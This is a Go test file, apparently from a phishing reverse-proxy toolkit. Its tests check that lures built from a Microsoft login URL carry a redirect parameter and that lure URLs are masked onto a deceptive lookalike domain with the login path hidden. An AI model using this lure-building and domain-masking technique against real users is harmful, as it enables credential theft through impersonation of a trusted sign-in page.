package console

import (
	"net/url"
	"strings"
	"testing"

	"github.com/user/evilpikin/internal/storage"
)

func TestBuildLures(t *testing.T) {
	tg := &storage.TargetProfile{
		ID:          "ms",
		ProxyHost:   "ms.test",
		LoginURLs:   []string{"https://login.microsoftonline.com/common/oauth2/authorize"},
		RedirectURL: "https://office.com/land",
	}
	lures := BuildLures(tg)
	if len(lures) != 1 {
		t.Fatalf("expected 1 lure, got %d", len(lures))
	}
	l := lures[0]
	if !strings.HasPrefix(l, "https://ms.test/common/oauth2/authorize") {
		t.Fatalf("bad host/path: %s", l)
	}
	if !strings.Contains(l, "r="+url.QueryEscape("https://office.com/land")) {
		t.Fatalf("redirect param missing: %s", l)
	}
}

func TestMaskLure(t *testing.T) {
	tg := &storage.TargetProfile{
		ID:        "ms",
		ProxyHost: "login.microsoftonline.com.evilpikin.net",
		PhishSub:  []string{"portal"},
	}
	raw := "https://login.microsoftonline.com.evilpikin.net/login?r=x"
	masked := MaskLure(tg, raw)
	if !strings.HasPrefix(masked, "https://portal.microsoftonline.com.evilpikin.net/portal") {
		t.Fatalf("mask failed: %s", masked)
	}
	if strings.Contains(masked, "/login") {
		t.Fatalf("path token not masked: %s", masked)
	}
}
